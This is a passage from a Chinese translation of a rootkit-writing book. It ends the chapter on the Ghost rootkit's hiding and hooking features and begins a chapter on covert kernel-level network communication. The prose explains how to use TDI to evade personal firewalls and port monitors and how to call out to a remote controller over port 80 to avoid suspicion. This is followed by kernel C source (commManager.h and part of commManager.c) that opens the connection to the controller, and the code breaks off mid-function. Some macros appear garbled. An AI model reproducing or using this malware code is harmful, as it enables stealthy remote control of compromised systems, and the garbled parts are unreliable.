信息“MyDeviceDriver off”并在 DebugView 中看到“comint32: allowing encryption”。
关闭 PGP desktop。
现在尝试相同的早期加密形式。被选择文件将被加密保存。
总结
我们现在拥有了具有如下功能的 rootkit：
隐藏设备驱动程序条目
隐藏配置文件
挂钩操作系统内核
挂钩操作系统加载进程中的被选进程
从用户模式应用程序发送进程指令
通过对 I/O 处理的基本了解，你现在可以开始准备解决通讯和驱动过滤。通讯功能可以
使 rootkit 与远程控制程序连接，同时驱动过滤可以使 rootkit 将自身注入到操作系统底层。
第六章包含底层通讯，第七章介绍驱动过滤。
笫六章 通讯
概述
本章介绍底层网络通讯。底层通讯是许多 rootkit 众多功能中的一个必须的。最基本的
原因是底层通讯不会被高层通讯发现，例如 socket-level 通讯可以被个人防火墙监控。这样
可以使得 rootkit 不被个人防火墙和端口监视器发现，例如 Sysinternal 的 portMon（端口监视
软件）。选择底层通讯的另外一个原因是需要区分 rootkit 通讯和普通网络通讯，作为 rootkit
和它远程控制端的连接是不需要被其他 rootkit 监视的。
本章包括如下内容：
传输驱动接口(TDI)
连接启动
一个远程控制通讯实例
传输驱动接口
rootkit 与其控制程序之间的通讯非常有可能引起 rootkit 监测程序的注意。为了降低被
监测到的可能性，通讯应该在最低层这样才最有可能绕过尽可能多的监测程序。对于 rootkit
开发者来说，我们的选择就是传输驱动接口，也就是 TDI。
TDI 是内核模式传输接口，在 socket 层以下的网络协议栈实现。这就意味着本地
socket-level（套接字水平）防火墙和网络过滤程序将不会发现 TDI 通讯，除非数据包被故意
向上传递到 socket layer（套接字层）。
操作系统必须提供命名驱动设备对象，以便可以使高层协议与底层设备通讯。这个标准
允许内核设备驱动使用 ZwCreateFile 来打开如“/device/tcp,”一样的设备，并可以通过
IoCallDriver 来路由 I/O 请求包(IRPs)以实现在最低通讯层(具有 TCP/IP 通讯能力的)与网络进
行通讯。
启动连接
许多 rootkit 创建一个通讯频道然后监听命令发送到一个特殊端口，或者监测所有网络
传输并从一个远程控制端监听特殊样式。这些设计的好处是隐秘，因为只是单纯的监听是很
难被发现的。不幸的是，这种设计会被具有禁止正向连接的联合防火墙击败。本章开发的
rootkit 将通过在初始化期间启动控制器连接的方法绕过这个问题。
几年前，在开机启动处理时启动反向连接将引起怀疑。甚至到现在为止，使用一些其他
HTTP 格式的数据包从 80 或 443 端口建立的反向连接也会引起怀疑，但是今天的软件变得
非常信任网络上的数据，并且检测上传到网络上的数据也变得很简单以至于在开机启动处理
时向外发送的 HTTP 和 HTTPS 连接也不会引起不必要的怀疑。
一个实例
为了实现通过底层 TDI 连接与远程 rootkit 客户端连接需要创建两个新文件和修改三个
已存在文件。另外，这个例子需要一个控制端。
新文件如下：
commManager.c
commManager.h
下面是被修改的文件：
Ghost.c
hookManager.c
SOURCES
Ghost rootkit 的控制端被命名为 GhostTracker。
GhostTracker 是多线程 C#应用程序，使用.NET framework 的 TCPClient 和 TCPListener
类。第 12 章将致力于控制端的编写，但是现在你不需要知道它是如何工作的，你只需要了
解它的功能就可以了。如果你有 C#编译环境，可以随便跳过前面并编译 GhostTracker 程序。
或者，在 Chapter12 GhostTracker 目录获得所需要的可执行文件。
在本书编译时你可以在 http://msdn.microsoft.com/vstudio/express/visualcsharp/download
下载并安装 C# Visual Studio。当你打开 GhostTracker 项目时，你需要将它转换成 2005 Express
C# 项目，然后你就可以正常编译并运行。
使用具体操作环境编译 GhostTracker 时，你要确保你的操作和配置正确。另外，你可以
在 debug 模式下运行它并可以在其基础上增加你自己想要的功能。此外，如果你有学习 C#
的打算，这将是一个很好的切入点!
在运行这个例子之前需要更改几处设置。在第二章配置 Ghost 时，一个网络地址和一个
通讯端口被写入到文件 c:\config32 中。那时“123.456.789.012:01234”很好的演示了交换数据
流是这样工作的，但是在本章中你将需要使用真实有效的 IP 地址。可以在命令提示符窗口
使用“ipconfig”命令获得本机 IP 地址。你可能有几个适配器，一些真实的或虚拟的，但是如
果你只有一个网络接口卡(NIC)，你将只有一个拥有有效 IP 地址的命令适配器。这个地址就
是你所需要写入 c:\config32 文件的。使用 80 端口和它所运行机器上的 IP 地址来配置
GhostTracker ， 因 此 必 须 增 加 “:00080” 到 你 的 IP 地 址 。 然 后 使 用 命 令 “echo
xxx.xxx.xxx.xxx:00080 > c:\config32”，这是使用你的电脑是真实有效 IP 地址。另外，注意要
为地址的每个数据段使用三个空间，为端口号分配五个空间；Ghost 不会很智能的解析这个
信息。ipconfig 命令如图 6-1 所示。
CommManager.h
CommManager.h
CommManager.h
CommManager.h
文件 commManager.h 中提供了一些有用的宏指令和在 commManager.c 中使用的函数原型。
代码如下：
// Copyright Ric Vieler, 2006
// Support header for commManager.c
#ifndef _COMM_MANAGER_H_
#define _COMM_MANAGER_H_
// TCP device name
#define COMM_TCP_DEVICE_NAME
L"\\Device\\Tcp"
// useful macros
#define INETADDR(a, b, c, d) (a + (b>8) +
((a&0xFF000000)>>24))
#define HTONS(a) (((0xFF&a)>8))
#define RECEIVE_BUFFER_SIZE
1024
NTSTATUS OpenTDIConnection();
void CloseTDIConnection();
NTSTATUS SendToRemoteController( char* buffer );
VOID timerDPC( PKDPC Dpc, PVOID DeferredContext, PVOID sys1, PVOID sys2 );
#endif
CommManager.c
CommManager.c
CommManager.c
CommManager.c
文件 commManager.c 提供了 commManager.h 中定义函数的子程序 ：
TDICompletionRoutine 当下一个底层驱动完成 I/O 请求时，这个子程序被调用。
OpenTDIConnection 这个子程序打开远程控制端连接。
CloseTDIConnection 这个子程序关闭远程控制端连接。
SendToRemoteController 这个子函数在 TDI 通讯链路上发送数据。
TimerDPC 这个子函数可以被用来循环查询来自远程控制端的命令。
// commManager
// Copyright Ric Vieler, 2006
// This file supports a TDI connection to
// masterAddress1.2.3.4 : masterPort
#include 
#include 
#include 
#include 
#include "commManager.h"
#include "configManager.h"
#include "Ghost.h"
// Globals
char*
pSendBuffer = NULL;
PMDL
pSendMdl = NULL;
PMDL
pReceiveMdl = NULL;
PFILE_OBJECT
pFileObject = NULL;
PDEVICE_OBJECT
pDeviceObject = NULL;
PKTIMER
pKernelTimer = NULL;
PKDPC
pKernelDPC = NULL;
PFILE_FULL_EA_INFORMATION
pFileInfo = NULL;
// Completion routine for all events (connect, send and receive)
static NTSTATUS TDICompletionRoutine(IN PDEVICE_OBJECT theDeviceObject, IN PIRP
theIrp, IN PVOID theContextP)
{
DbgPrint("comint32: TDICompletionRoutine().");
if( theContextP != NULL )
KeSetEvent( (PKEVENT)theContextP, 0, FALSE );
return( STATUS_MORE_PROCESSING_REQUIRED );
}
// Open a TDI channel and connect to masterAddress1.2.3.4 : masterPort
NTSTATUS OpenTDIConnection()
{
int port;
int address1;
int address2;
int address3;
int address4;
NTSTATUS status;
UNICODE_STRING TdiTransportDeviceName;
OBJECT_ATTRIBUTES TdiAttributes;
HANDLE TdiAddressHandle;
HANDLE TdiEndpointHandle;
IO_STATUS_BLOCK IoStatusBlock;
PTA_IP_ADDRESS pAddress;
CONNECTION_CONTEXT connectionContext = NULL;
ULONG eaSize;
PIRP pIrp;
PVOID pAddressFileObject;
KEVENT irpCompleteEvent;
KEVENT connectionEvent;
TA_IP_ADDRESS controllerTaIpAddress;
ULONG controllerIpAddress;
USHORT controllerPort;
TDI_CONNECTION_INFORMATION controllerConnection;
LARGE_INTEGER timeout;
static char eaBuffer[ sizeof(FILE_FULL_EA_INFORMATION) +
TDI_TRANSPORT_ADDRESS_LENGTH +
sizeof(TA_IP_ADDRESS) ];
PFILE_FULL_EA_INFORMATION
pEaBuffer
=
(PFILE_FULL_EA_INFORMATION)eaBuffer;
// Build Unicode transport device name.
RtlInitUnicodeString( &TdiTransportDeviceName,
COMM_TCP_DEVICE_NAME ); // "/device/tcp"
// create object attribs
InitializeObjectAttributes( &TdiAttributes,
&TdiTransportDeviceName,
OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
0,
0 );
pEaBuffer->NextEntryOffset = 0;
pEaBuffer->Flags = 0;
pEaBuffer->EaNameLength = TDI_TRANSPORT_ADDRESS_LENGTH;
// Copy TdiTransportAddress
memcpy( pEaBuffer->EaName,
TdiTransportAddress,
pEaBuffer->EaNameLength + 1 );
// EaValue represents of the local host IP address and port
pEaBuffer->EaValueLength = sizeof(TA_IP_ADDRESS);
pAddress = (PTA_IP_ADDRESS)
(pEaBuffer->EaName + pEaBuffer->EaNameLength + 1);
pAddress->TAAddressCount = 1;
pAddress->Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;
pAddress->Address[0].AddressType = TDI_ADDRESS_TYPE_IP;
pAddress->Address[0].Address[0].sin_port = 0; // any port
pAddress->Address[0].Address[0].in_addr = 0; // local address
memset( pAddress->Address[0].Address[0].sin_zero, 0,
sizeof(pAddress->Address[0].Address[0].sin_zero) );
// Get the transport device
status = ZwCreateFile( &TdiAddressHandle,
GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
&TdiAttributes,
&IoStatusBlock,
0,
FILE_ATTRIBUTE_NORMAL,
FILE_SHARE_READ,
FILE_OPEN,
0,
pEaBuffer,
sizeof(eaBuffer) );
if( !NT_SUCCESS( status ) )
{
DbgPrint("comint32: OpenTDIConnection() ZwCreate #1 failed, Status = %0x",
status);
return STATUS_UNSUCCESSFUL;
}
// get object handle
status = ObReferenceObjectByHandle( TdiAddressHandle,
FILE_ANY_ACCESS,
0,
KernelMode,
(PVOID *)&pAddressFileObject,
NULL );
// Open a TDI endpoint
eaSize = FIELD_OFFSET(FILE_FULL_EA_INFORMATION, EaName) +
TDI_CONNECTION_CONTEXT_LENGTH + 1 +
sizeof(CONNECTION_CONTEXT);
// Overwrite pEaBuffer
pFileInfo = (PFILE_FULL_EA_INFORMATION)ExAllocatePool(NonPagedPool, eaSize);
if( pFileInfo == NULL )
{
DbgPrint("comint32: OpenTDIConnection() failed to allocate buffer");
return STATUS_INSUFFICIENT_RESOURCES;
}
// Set file info
memset(pFileInfo, 0, eaSize);
pFileInfo->NextEntryOffset = 0;
pFileInfo->Flags = 0;
pFileInfo->EaNameLength = TDI_CONNECTION_CONTEXT_LENGTH;
memcpy( pFileInfo->EaName,
TdiConnectionContext,
pFileInfo->EaNameLength + 1 ); //includes NULL terminator
// CONNECTION_CONTEXT is a user defined structure used to sort connections
// There is only one connection in this example, so CONNECTION_CONTEXT is not used
pFileInfo->EaValueLength = sizeof(CONNECTION_CONTEXT);
*(CONNECTION_CONTEXT*)(pFileInfo->EaName+(pFileInfo->EaNameLength + 1)) =
(CONNECTION_CONTEXT) connectionContext;
status = ZwCreateFile( &TdiEndpointHandle,
GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
&TdiAttributes,
&IoStatusBlock,
0,
FILE_ATTRIBUTE_NORMAL,
FILE_SHARE_READ,
FILE_OPEN,
0,
pFileInfo,
sizeof(eaBuffer) );
if( !NT_SUCCESS( status ) )
{
DbgPrint("comint32: OpenTDIConnection() ZwCreate #2 failed, Status = %0x",
status);
return STATUS_UNSUCCESSFUL;
}
// get object handle
status = ObReferenceObjectByHandle( TdiEndpointHandle,
FILE_ANY_ACCESS,
0,
KernelMode,
(PVOID *)&pFileObject,
NULL );
// Associate endpoint with address
pDeviceObject = IoGetRelatedDeviceObject( pAddressFileObject );
// Define a completion event
KeInitializeEvent( &irpCompleteEvent, NotificationEvent, FALSE );
// Build IO Request Packet
pIrp = TdiBuildInternalDeviceControlIrp( TDI_ASSOCIATE_ADDRESS,
pDeviceObject,
pFileObject,
&irpCompleteEvent,
&IoStatusBlock );
if( pIrp == NULL )
{
DbgPrint("comint32: No IRP for TDI_ASSOCIATE_ADDRESS");
return( STATUS_INSUFFICIENT_RESOURCES );
}
// Extend the IRP
TdiBuildAssociateAddress(pIrp,
pDeviceObject,
pFileObject,
NULL,
NULL,
TdiAddressHandle );
// set completion routine
IoSetCompletionRoutine( pIrp, TDICompletionRoutine, &irpCompleteEvent, TRUE, TRUE,
TRUE);
// Send the packet
status = IoCallDriver( pDeviceObject, pIrp );
// Wait
if( status == STATUS_PENDING )
{
DbgPrint("comint32: OpenTDIConnection() Waiting on IRP (associate)...");
KeWaitForSingleObject(&irpCompleteEvent, Executive, KernelMode, FALSE, 0);
}
if( ( status != STATUS_SUCCESS) &&
( status != STATUS_PENDING ) )
{
DbgPrint("comint32: OpenTDIConnection() IoCallDriver #1 failed. Status = %0x",
status);
return STATUS_UNSUCCESSFUL;
}
// Connect to the remote controller
KeInitializeEvent(&connectionEvent, NotificationEvent, FALSE);
// build connection packet
pIrp = TdiBuildInternalDeviceControlIrp( TDI_CONNECT,
pDeviceObject,
pFileObject,
&connectionEvent,
&IoStatusBlock );
if( pIrp == NULL )
{
DbgPrint("comint32: OpenTDIConnection() could not get an IRP for TDI_CONNECT");
return( STATUS_INSUFFICIENT_RESOURCES );
}
// Initialize controller data
address1 = atoi(masterAddress1);
address2 = atoi(masterAddress2);
address3 = atoi(masterAddress3);
address4 = atoi(masterAddress4);
port = atoi(masterPort);
controllerPort = HTONS(port);
controllerIpAddress = INETADDR(address1,address2,address3,address4);
controllerTaIpAddress.TAAddressCount = 1;